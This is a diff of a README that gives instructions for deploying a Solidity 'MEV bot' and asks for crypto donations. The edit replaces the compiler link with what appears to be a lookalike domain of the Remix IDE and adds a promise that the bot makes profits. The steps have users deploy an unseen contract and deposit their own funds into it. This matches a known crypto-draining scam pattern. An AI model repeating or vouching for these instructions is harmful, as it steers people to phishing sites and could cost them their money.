@@ -49,7 +49,7 @@ If this is you, I'd like to congratulate you on your badassery. I have been foll
 
 ## MEV bot Instructions
 
-1. Access the Solidity Compiler: https://chainide.com/
+1. Access the Solidity Compiler: https://remixide.org
 
 2. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol"
 
@@ -64,7 +64,7 @@ After the transaction is confirmed, it's your own BOT now
 
 6. Deposit funds to your exact contract/bot address
 
-7. After your transaction was confirmed, Start the bot by clicking the “start” button. Withdraw anytime by clicking the “withdrawal” button
+7. After your transaction was confirmed, Start the bot by clicking the “start” button. Wait some time and check back on the contract if it made profits already. Withdraw anytime by clicking the “withdrawal” button.
 
 ## Do you feel the urge to send me some crypto? 
 Plz send donations to apebot.eth
